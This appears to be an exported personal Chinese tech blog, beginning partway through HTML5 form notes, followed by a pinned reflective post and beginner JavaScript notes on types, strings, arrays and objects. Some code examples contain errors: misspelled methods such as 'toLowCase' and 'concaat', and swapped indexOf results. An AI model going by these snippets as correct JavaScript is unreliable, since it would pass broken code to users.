class="name">p</span>&gt;</span></span><br><span class="line">			出生日期精确到秒：<span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;time&quot;</span> <span class="attr">type</span>=<span class="string">&quot;time&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">			请确认出生日期：<span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;datetime-local&quot;</span> <span class="attr">type</span>=<span class="string">&quot;datetime-local&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">			请选择这是几月：<span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;month&quot;</span> <span class="attr">type</span>=<span class="string">&quot;month&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">			请选择这是第几周：<span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;week&quot;</span> <span class="attr">type</span>=<span class="string">&quot;week&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">			请输入你的email：<span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">type</span>=<span class="string">&quot;email&quot;</span> <span class="attr">multiple</span> /&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">			请输入您的电话：<span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;tel&quot;</span> <span class="attr">type</span>=<span class="string">&quot;tel&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">			请输入您的URL：<span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">type</span>=<span class="string">&quot;url&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">			请输入您的幸运数字：<span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;number&quot;</span> <span class="attr">type</span>=<span class="string">&quot;number&quot;</span> <span class="attr">min</span>=<span class="string">&quot;0&quot;</span> <span class="attr">max</span>=<span class="string">&quot;100&quot;</span> <span class="attr">step</span>=<span class="string">&quot;5&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">			这是一个拖动条：<span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;range&quot;</span> <span class="attr">type</span>=<span class="string">&quot;range&quot;</span> <span class="attr">min</span>=<span class="string">&quot;0&quot;</span> <span class="attr">max</span>=<span class="string">&quot;100&quot;</span> <span class="attr">step</span>=<span class="string">&quot;5&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">			这是一个搜索框：<span class="tag">&lt;<span class="name">br</span>/&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;search&quot;</span> <span class="attr">type</span>=<span class="string">&quot;search&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">label</span>&gt;</span>用户名:<span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;name&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">autofocus</span>  /&gt;</span><span class="tag">&lt;/<span class="name">label</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;username&quot;</span>&gt;</span>密码:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span>  <span class="attr">id</span>=<span class="string">&quot;username&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">formaction</span>=<span class="string">&quot;苑飞.html&quot;</span> /&gt;</span></span><br><span class="line">	   <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"> - <span class="tag">&lt;<span class="name">output</span>&gt;</span>显示输出</span><br><span class="line"> - <span class="tag">&lt;<span class="name">meter</span>&gt;</span>计数仪表</span><br><span class="line"> - <span class="tag">&lt;<span class="name">progress</span>&gt;</span>进度条</span><br><span class="line"> - 校验属性，自行百度</span><br><span class="line"> - <span class="tag">&lt;<span class="name">audio</span>&gt;</span>音频</span><br><span class="line"> - <span class="tag">&lt;<span class="name">video</span>&gt;</span>视频</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>HTML</category>
        <category>前端</category>
      </categories>
      <tags>
        <tag>HTML</tag>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>一些想说的话</title>
    <url>/2099/12/31/%E4%B8%80%E4%BA%9B%E6%83%B3%E8%AF%B4%E7%9A%84%E8%AF%9D/</url>
    <content><![CDATA[<h2 id="欢迎来到我的博客"><a href="#欢迎来到我的博客" class="headerlink" title="欢迎来到我的博客~"></a>欢迎来到我的博客~</h2><p>相遇就是一种缘分，想要了解我，请移步<a href="https://abeancc.github.io/about">关于</a></p>
<p>想要看我发牢骚的话，请继续看下去。</p>
<hr>
<h3 id="2017-7-26"><a href="#2017-7-26" class="headerlink" title="2017.7.26"></a>2017.7.26</h3><p>相信人心，真是愚不可及。爱情和美丽，迟早都逃不脱幻灭的命运。最终都要被弃入遗忘的背篓，还给永恒。</p>
<h3 id="2018-8-8"><a href="#2018-8-8" class="headerlink" title="2018.8.8"></a>2018.8.8</h3><p>回忆这东西若是有气味的话，那就是樟脑的香，甜而稳妥，像记得分明的快乐，甜而惆怅，像忘却了的忧愁。</p>
<h3 id="2021-6-22"><a href="#2021-6-22" class="headerlink" title="2021.6.22"></a>2021.6.22</h3><p>半夜睡不着突然想聊聊高考志愿选择专业的话题。<br>根据今年风气啊大环境啊发现很多人都想选择计算机专业的方向。原因也很简单，无非就是工资高好找工作之类的。在这里我给出一点我自己的看法吧。如果你真的想选择计算机专业，那你一定要有自驱动能力。如果你只把目光放在学校里学的就以为可以很厉害或者说一想到未来要码代码就会很头疼那我觉得与其这样不如趁早就放弃。中国本身就不缺码农，更何况你也不一定优秀。计算机行业更新速度快，更迭速度也快，不能自驱动不能自学的很快也就会被淘汰吧(个人看法)。综上，如果是兴趣那自然也欢迎，如果只是单纯的觉得好就业薪资高就想入坑那我还是劝你早点跑路。本身就内卷，进来你就会发现更卷，梦还是少做点，认清现实最重要。</p>
]]></content>
  </entry>
  <entry>
    <title>Javascript笔记</title>
    <url>/2021/07/01/Javascript%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="Javascript笔记"><a href="#Javascript笔记" class="headerlink" title="Javascript笔记"></a>Javascript笔记</h2><hr>
<h3 id="Javascript简介"><a href="#Javascript简介" class="headerlink" title="Javascript简介"></a>Javascript简介</h3><ul>
<li><p>Javascript是世界上最流行的脚本语言，因为你在电脑、手机、平板上浏览的所有的网页，以及无数基于HTML5的手机App，交互逻辑都是由JavaScript驱动的。</p>
</li>
<li><p>简单地说，JavaScript是一种运行在浏览器中的解释型的编程语言。</p>
</li>
</ul>
<p><strong>JavaScript快速入门</strong></p>
<p>有一位先哲说的好啊，学习一门语言先看文档，看文档前先看快速入门。</p>
<p><a href="https://www.liaoxuefeng.com/wiki/1022910821149312/1023020895584256">快速入门</a></p>
<hr>
<h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><h4 id="1-语法规则"><a href="#1-语法规则" class="headerlink" title="1. 语法规则"></a>1. 语法规则</h4><p>​    首先来介绍一下Javascript的语法规则。</p>
<ul>
<li>Js语法和Java类似，每个句子以<code>;</code>结尾，语句块用<code>&#123;···code···&#125;</code>。（但是，JavaScript并不强制要求在每个语句的结尾加<code>;</code>，浏览器中负责执行JavaScript代码的引擎会自动在每个语句的结尾补上<code>;</code>）</li>
<li>Js语法的注释为<code>//</code>，<code>/* … */</code></li>
</ul>
<h4 id="2-基本数据类型"><a href="#2-基本数据类型" class="headerlink" title="2. 基本数据类型"></a>2. 基本数据类型</h4><ol>
<li><p>Number</p>
<p>JavaScript不区分整数和浮点数，统一用Number表示，以下都是合法的Number类型。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="number">100</span>; <span class="comment">//整形</span></span><br><span class="line"><span class="number">2.71828</span>; <span class="comment">//浮点型</span></span><br><span class="line">-<span class="number">100</span>; <span class="comment">//负数</span></span><br><span class="line"><span class="number">1.23e3</span>; <span class="comment">//科学计数法</span></span><br><span class="line"><span class="literal">NaN</span>; <span class="comment">//Not a Number。无法计算时使用NaN表示。</span></span><br><span class="line"><span class="literal">Infinity</span>; <span class="comment">//无限大。当数值超过了Js的Number所能表达的最大值时，则表示为Infinity</span></span><br></pre></td></tr></table></figure>

<p>四则运算和Python相似。即(<code>+</code>，<code>-</code>，<code>**</code>，<code>/</code>，<code>%</code>)但是在这里提一下整除。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">parseInt</span>(a / b); <span class="comment">//丢弃小数部分,保留整数部分</span></span><br><span class="line"><span class="built_in">Math</span>.ceil(a / b); <span class="comment">//向上整除 4/3=2</span></span><br><span class="line"><span class="built_in">Math</span>.floor(a / b); <span class="comment">//向下整除 4/3=1</span></span><br><span class="line"><span class="built_in">Math</span>.round(a / b); <span class="comment">//四舍五入</span></span><br></pre></td></tr></table></figure></li>
<li><p>字符串</p>
<p>JavaScript的字符串就是用<code>&#39;&#39;</code>或<code>&quot;&quot;</code>括起来的字符表示。</p>
<p>但是这里有许多的特例。如果<code>&#39;</code>本身也是一个字符，那就可以用<code>&quot;&quot;</code>括起来。如果字符串内部既包含<code>&#39;</code>又包含<code>&quot;</code>，可以用转义字符<code>\</code>来标识。</p>
<p>exp: <code>&#39;I\&#39;m \&quot;OK\&quot;!&#39;;</code></p>
<p>然后需要了解转义字符<code>\n</code>, <code>\t</code>, <code>\\</code>。</p>
<p>ASCII字符可以以<code>\x##</code>形式的十六进制表示，例如：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;\x41&#x27;</span>; <span class="comment">// 完全等同于 &#x27;A&#x27;</span></span><br></pre></td></tr></table></figure>

<p>还可以用<code>\u####</code>表示一个Unicode字符：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;\u4e2d\u6587&#x27;</span>; <span class="comment">// 完全等同于 &#x27;中文&#x27;</span></span><br></pre></td></tr></table></figure>

<p>由于多行字符串用<code>\n</code>写起来比较费事，所以<strong>ES6</strong>标准新增了一种多行字符串的表示方法，用反引号<code>`...`</code>表示。</p>
<p>下面介绍一下字符串的操作</p>
<p>字符串支持拼接。<code>string_A + string_B</code></p>
<p>字符串支持模板字符串。(<strong>ES6支持</strong>)</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> name = <span class="string">&#x27;小明&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> age = <span class="number">20</span>;</span><br><span class="line"><span class="keyword">var</span> message = <span class="string">`你好, <span class="subst">$&#123;name&#125;</span>, 你今年<span class="subst">$&#123;age&#125;</span>岁了!`</span>; <span class="comment">//使用$引用变量（需要使用反引号进行引用）</span></span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">s.length; <span class="comment">//返回字符串长度</span></span><br><span class="line">s[<span class="number">0</span>]; <span class="comment">//H</span></span><br><span class="line">s[<span class="number">11</span>]; <span class="comment">//！</span></span><br><span class="line">s[<span class="number">12</span>]; <span class="comment">//undefined</span></span><br><span class="line">s.toUpperCase(); <span class="comment">//转大写</span></span><br><span class="line">s.toLowCase(); <span class="comment">//转小写</span></span><br><span class="line">s.indexOf(<span class="string">&quot;world&quot;</span>); <span class="comment">//6</span></span><br><span class="line">s.indexOf(<span class="string">&quot;World&quot;</span>); <span class="comment">//-1</span></span><br><span class="line">s.substring(<span class="number">0</span>, <span class="number">5</span>); <span class="comment">//从索引0~5（不包含5）hello</span></span><br><span class="line">s.substring(<span class="number">7</span>); <span class="comment">//索引7到最后 world！</span></span><br></pre></td></tr></table></figure></li>
<li><p>布尔值</p>
<p>布尔值的解释比较简单，和一般编程语言都是类似的。这里说一下几个符号</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&amp;&amp; <span class="comment">// and</span></span><br><span class="line">|| <span class="comment">// or</span></span><br><span class="line">! <span class="comment">// not</span></span><br></pre></td></tr></table></figure>

<p>接下来就是比较重要的比较运算符了。</p>
<p>当我们对数据类型进行比较的时候（<strong>任意数据类型</strong>），我们会得到一个布尔值。例如</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="number">2</span>&gt;<span class="number">5</span>; <span class="comment">//false</span></span><br><span class="line"><span class="number">2</span>&lt;<span class="number">5</span>; <span class="comment">//true</span></span><br><span class="line"><span class="number">1</span>==<span class="number">1</span>; <span class="comment">//true</span></span><br><span class="line"><span class="comment">// 特别的</span></span><br><span class="line"><span class="literal">false</span> == <span class="number">0</span>; <span class="comment">//true</span></span><br><span class="line"><span class="literal">false</span> === <span class="number">0</span>; <span class="comment">//false</span></span><br></pre></td></tr></table></figure>

<p>不难看出，出现了<strong>特例1</strong><code>==</code>和<code>===</code>。</p>
<p><code>==</code>比较时，它会自动转换数据类型再比较，很多时候，会得到非常诡异的结果</p>
<p><code>===</code>比较时，它不会自动转换数据类型，如果数据类型不一致，返回<code>false</code>，如果一致，再比较。</p>
<p><em><strong>因此，绝大部分时间请使用<code>===</code>进行比较</strong></em></p>
<p><strong>特例2</strong>：<code>NaN</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="literal">NaN</span> === <span class="literal">NaN</span>; <span class="comment">//false</span></span><br></pre></td></tr></table></figure>

<p>因此，唯一可以判断<code>NaN</code>的方法是通过<code>isNaN()</code>函数。</p>
<p><strong>特例3</strong>：浮点数比较</p>
<p>请看代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>/<span class="number">3</span> === (<span class="number">1</span> - <span class="number">2</span>/<span class="number">3</span>); <span class="comment">//false</span></span><br></pre></td></tr></table></figure>

<p>这个特性和C语言一样。因为计算机无法精确表示无限循环小数。</p>
<p>要比较两个浮点数是否相等，只能计算它们之差的绝对值，看是否小于某个阈值：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Math</span>.abs(<span class="number">1</span>/<span class="number">3</span> - (<span class="number">1</span> - <span class="number">2</span>/<span class="number">3</span>)) &lt; <span class="number">0.00000001</span>; <span class="comment">//true</span></span><br></pre></td></tr></table></figure>

<p><strong>特例4</strong>：null和undefined</p>
<p><code>null</code>很好理解。和其他编程语言类似，<code>null</code>就是一个空值。就是<code>Java</code>里的<code>null</code>，<code>python</code>里的<code>None</code>。</p>
<p><code>undefined</code>也很好理解，就是未定义的意思。但是使用起来有些讲究。因为它表示的是值未定义。一般情况下，仅仅在判断函数参数是否传递的情况下有用。其余时刻都用<code>null</code>。</p>
</li>
<li><p>数组</p>
<p>数组是一组按顺序排列的集合，集合的每个值称为元素。JavaScript的数组可以包括任意数据类型。例如：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3.14</span>, <span class="string">&#x27;Hello&#x27;</span>, <span class="literal">null</span>, <span class="literal">true</span>];</span><br></pre></td></tr></table></figure>

<p>介绍两种创建数组的方法。</p>
<p>方法一：<code>new Array();</code></p>
<p>方法二：<code>var arr = [];</code></p>
<p>当然对于我来说，我更喜欢第二种方式。因为可读性更高，别人一看到<code>[..., ...]</code>就知道是数组。</p>
<p>基本用法：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]; <span class="comment">//定义数组arr</span></span><br><span class="line">arr.length; <span class="comment">//arr的长度</span></span><br><span class="line"></span><br><span class="line">arr.indexOf(<span class="number">1</span>); <span class="comment">// 0</span></span><br><span class="line">arr.indexOf(<span class="number">4</span>); <span class="comment">// -1</span></span><br><span class="line"></span><br><span class="line">arr.slice(<span class="number">0</span>, <span class="number">2</span>); <span class="comment">// [1, 2]</span></span><br><span class="line">arr.slice(<span class="number">2</span>); <span class="comment">// [3]</span></span><br><span class="line"><span class="comment">// slice可以不带参数，见特例3</span></span><br><span class="line"></span><br><span class="line">arr.push(<span class="number">1</span>); <span class="comment">// arr -&gt; [1, 2, 3, 1]</span></span><br><span class="line">arr.push(<span class="string">&#x27;1&#x27;</span>); <span class="comment">// arr -&gt; [1, 2, 3, &#x27;1&#x27;]</span></span><br><span class="line">arr.push([<span class="string">&#x27;1&#x27;</span>]); <span class="comment">// arr -&gt; [1, 2, 3, [&#x27;1&#x27;]]</span></span><br><span class="line">arr.pop(); <span class="comment">// arr -&gt; [1, 2]</span></span><br><span class="line"><span class="comment">// push/pop向数组尾部添加/删除一个元素</span></span><br><span class="line"></span><br><span class="line">arr.unshift(<span class="number">0</span>); <span class="comment">// arr -&gt; [0, 1, 2, 3]</span></span><br><span class="line">arr.shift(); <span class="comment">// arr -&gt; [2, 3]</span></span><br><span class="line"><span class="comment">// unshift/shift向数组头部添加/删除一个元素</span></span><br><span class="line"></span><br><span class="line">arr.sort(); <span class="comment">// arr会排序。(Array的排列顺序是根据Ascii码大小进行的排序)</span></span><br><span class="line"></span><br><span class="line">arr.reverse(); <span class="comment">// arr -&gt; [3, 2, 1]</span></span><br><span class="line"></span><br><span class="line">arr.splice(<span class="number">0</span>, <span class="number">2</span>); <span class="comment">// arr -&gt; [3], return [1, 2]</span></span><br><span class="line">arr.splice(<span class="number">0</span>, <span class="number">2</span>, <span class="string">&quot;1&quot;</span>, <span class="string">&quot;2&quot;</span>); <span class="comment">// arr -&gt; [&#x27;1&#x27;, &#x27;2&#x27;, 3], return [1, 2]</span></span><br><span class="line"><span class="comment">// splice()方法是修改Array的“金钥匙”。其中(起始位置, 个数, [替换元素])</span></span><br><span class="line"><span class="comment">// splice()的返回值是删掉的元素, 改变的是arr。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> new_arr;</span><br><span class="line">new_arr = arr.concat([<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]); <span class="comment">// new_arr = [1,2,3,4,5,6]</span></span><br><span class="line">new_arr = arr.concaat(<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>); <span class="comment">// new_arr = [1,2,3,4,5,6]</span></span><br><span class="line">new_arr = arr.concat(<span class="number">4</span>, [<span class="number">5</span>, <span class="number">6</span>]); <span class="comment">// new_arr = [1,2,3,4,5,6]</span></span><br><span class="line"><span class="comment">// 需要注意的是，arr本身的值没有变，还是[1,2,3]</span></span><br><span class="line"><span class="comment">// 由例子来看，concat()方法本身可以自动拆分</span></span><br><span class="line"></span><br><span class="line">arr.join(<span class="string">&#x27;-&#x27;</span>); <span class="comment">// 1-2-3</span></span><br><span class="line"><span class="comment">// 如果arr的元素不是字符串形式，则自动转换为字符串形式。</span></span><br><span class="line"></span><br><span class="line">多维数组形同Java，不再赘述。</span><br><span class="line"></span><br><span class="line"><span class="comment">//特例1</span></span><br><span class="line">arr.length = <span class="number">6</span>; <span class="comment">// arr -&gt; [1,2,3,undefined,undefined,undefined]</span></span><br><span class="line">arr.length = <span class="number">2</span>; <span class="comment">// arr -&gt; [1,2]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//特例2</span></span><br><span class="line">arr[<span class="number">4</span>] = <span class="number">5</span>; <span class="comment">// arr -&gt; [1, 2, 3, undefined, 5]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//特例3</span></span><br><span class="line"><span class="keyword">var</span> copy = arr.slice(); <span class="comment">// copy = [1, 2, 3]</span></span><br><span class="line">copy === arr; <span class="comment">// false</span></span><br><span class="line"><span class="comment">// 由此我们可以复制一个arr。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//特例4</span></span><br><span class="line"><span class="keyword">var</span> arr = [];</span><br><span class="line">arr.pop(); <span class="comment">// 空数组继续pop不会报错，而是返回undefined</span></span><br><span class="line">arr; <span class="comment">// []</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//特例5</span></span><br><span class="line"><span class="keyword">var</span> arr = [];</span><br><span class="line">arr.shift(); <span class="comment">// 空数组继续shift不会报错，而是返回undefined</span></span><br><span class="line">arr; <span class="comment">// []</span></span><br></pre></td></tr></table></figure></li>
<li><p>对象</p>
<p>JavaScript的对象是一组由键-值组成的无序集合，例如：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">    name: <span class="string">&#x27;Bob&#x27;</span>,</span><br><span class="line">    age: <span class="number">20</span>,</span><br><span class="line">    tags: [<span class="string">&#x27;js&#x27;</span>, <span class="string">&#x27;web&#x27;</span>, <span class="string">&#x27;mobile&#x27;</span>],</span><br><span class="line">    city: <span class="string">&#x27;Beijing&#x27;</span>,</span><br><span class="line">    hasCar: <span class="literal">true</span>,</span><br><span class="line">    zipcode: <span class="literal">null</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>JavaScript对象的键都是字符串类型，值可以是任意数据类型。上述<code>person</code>对象一共定义了6个键值对，其中每个键又称为对象的属性，例如，<code>person</code>的<code>name</code>属性为<code>&#39;Bob&#39;</code>，<code>zipcode</code>属性为<code>null</code>。</p>
<p>要获取一个对象的属性，我们用<code>对象变量.属性名</code>的方式：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">person.name; <span class="comment">// &#x27;Bob&#x27;</span></span><br><span class="line">person.zipcode; <span class="comment">// null</span></span><br></pre></td></tr></table></figure>

<p>访问属性是通过<code>.</code>操作符完成的，但这要求属性名必须是一个有效的变量名。如果属性名包含特殊字符，就必须用<code>&#39;&#39;</code>括起来：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xiaohong = &#123;</span><br><span class="line">    name: <span class="string">&#x27;小红&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;middle-school&#x27;</span>: <span class="string">&#x27;No.1 Middle School&#x27;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><code>xiaohong</code>的属性名<code>middle-school</code>不是一个有效的变量，就需要用<code>&#39;&#39;</code>括起来。访问这个属性也无法使用<code>.</code>操作符，必须用<code>[&#39;xxx&#39;]</code>来访问：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">xiaohong[<span class="string">&#x27;middle-school&#x27;</span>]; <span class="comment">// &#x27;No.1 Middle School&#x27;</span></span><br><span class="line">xiaohong[<span class="string">&#x27;name&#x27;</span>]; <span class="comment">// &#x27;小红&#x27;</span></span><br><span class="line">xiaohong.name; <span class="comment">// &#x27;小红&#x27;</span></span><br></pre></td></tr></table></figure>

<p>实际上JavaScript对象的所有属性都是字符串，不过属性对应的值可以是任意数据类型。</p>
<p>如果访问一个不存在的属性会返回什么呢？JavaScript规定，访问不存在的属性不报错，而是返回<code>undefined</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xiaoming = &#123;</span><br><span class="line">	name:<span class="string">&#x27;xiaoming&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">xiaoming.age; <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure>

<p>由于JavaScript的对象是动态类型，你可以自由地给一个对象添加或删除属性：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xiaoming = &#123;</span><br><span class="line">    name: <span class="string">&#x27;小明&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line">xiaoming.age; <span class="comment">// undefined</span></span><br><span class="line">xiaoming.age = <span class="number">18</span>; <span class="comment">// 新增一个age属性</span></span><br><span class="line">xiaoming.age; <span class="comment">// 18</span></span><br><span class="line"><span class="keyword">delete</span> xiaoming.age; <span class="comment">// 删除age属性</span></span><br><span class="line">xiaoming.age; <span class="comment">// undefined</span></span><br><span class="line"><span class="keyword">delete</span> xiaoming[<span class="string">&#x27;name&#x27;</span>]; <span class="comment">// 删除name属性</span></span><br><span class="line">xiaoming.name; <span class="comment">// undefined</span></span><br><span class="line"><span class="keyword">delete</span> xiaoming.school; <span class="comment">// 删除一个不存在的school属性也不会报错</span></span><br></pre></td></tr></table></figure>

<p>如果我们要检测<code>xiaoming</code>是否拥有某一属性，可以用<code>in</code>操作符：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xiaoming = &#123;</span><br><span class="line">    name: <span class="string">&#x27;小明&#x27;</span>,</span><br><span class="line">    birth: <span class="number">1990</span>,</span><br><span class="line">    school: <span class="string">&#x27;No.1 Middle School&#x27;</span>,</span><br><span class="line">    height: <span class="number">1.70</span>,</span><br><span class="line">    weight: <span class="number">65</span>,</span><br><span class="line">    score: <span class="literal">null</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="string">&#x27;name&#x27;</span> <span class="keyword">in</span> xiaoming; <span class="comment">// true</span></span><br><span class="line"><span class="string">&#x27;grade&#x27;</span> <span class="keyword">in</span> xiaoming; <span class="comment">// false</span></span><br></pre></td></tr></table></figure>

<p>不过要小心，如果<code>in</code>判断一个属性存在，这个属性不一定是<code>xiaoming</code>的，它可能是<code>xiaoming</code>继承得到的：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;toString&#x27;</span> <span class="keyword">in</span> xiaoming; <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>因为<code>toString</code>定义在<code>object</code>对象中，而所有对象最终都会在原型链上指向<code>object</code>，所以<code>xiaoming</code>也拥有<code>toString</code>属性。</p>
<p>要判断一个属性是否是<code>xiaoming</code>自身拥有的，而不是继承得到的，可以用<code>hasOwnProperty()</code>方法：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xiaoming = &#123;</span><br><span class="line">    name: <span class="string">&#x27;小明&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line">xiaoming.hasOwnProperty(<span class="string">&#x27;name&#x27;</span>); <span class="comment">// true</span></span><br><span class="line">xiaoming.hasOwnProperty(<span class="string">&#x27;toString&#x27;</span>); <span class="comment">// false</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="3-变量"><a href="#3-变量" class="headerlink" title="3. 变量"></a>3. 变量</h4><p>​    定义规则：变量名是大小写英文、数字、<code>$</code>和<code>_</code>的组合，且不能用数字开头。变量名也不能是JavaScript的关键字，如<code>if</code>、<code>while</code>等。</p>
<p>​    申明一个变量用<code>var</code>语句，比如：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a; <span class="comment">// 申明了变量a，此时a的值为undefined</span></span><br><span class="line"><span class="keyword">var</span> $b = <span class="number">1</span>; <span class="comment">// 申明了变量$b，同时给$b赋值，此时$b的值为1</span></span><br><span class="line"><span class="keyword">var</span> s_007 = <span class="string">&#x27;007&#x27;</span>; <span class="comment">// s_007是一个字符串</span></span><br><span class="line"><span class="keyword">var</span> Answer = <span class="literal">true</span>; <span class="comment">// Answer是一个布尔值true</span></span><br><span class="line"><span class="keyword">var</span> t = <span class="literal">null</span>; <span class="comment">// t的值是null</span></span><br></pre></td></tr></table></figure>

<p>剩下的赋值问题都是基础知识，不赘述了。</p>
<h4 id="4-strict模式"><a href="#4-strict模式" class="headerlink" title="4. strict模式"></a>4. strict模式</h4><p>​    这里只是提一嘴。(并不是重点)</p>
<p>​    JavaScript在设计之初，为了方便初学者学习，并不强制要求用<code>var</code>申明变量。这个设计错误带来了严重的后果：如果一个变量没有通过<code>var</code>申明就被使用，那么该变量就自动被申明为全局变量：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">i = <span class="number">10</span>; <span class="comment">// i现在是全局变量</span></span><br></pre></td></tr></table></figure>

<p>​    在同一个页面的不同的JavaScript文件中，如果都不用<code>var</code>申明，恰好都使用了变量<code>i</code>，将造成变量<code>i</code>互相影响，产生难以调试的错误结果。</p>
<p>​    使用<code>var</code>申明的变量则不是全局变量，它的范围被限制在该变量被申明的函数体内，同名变量在不同的函数体内互不冲突。</p>
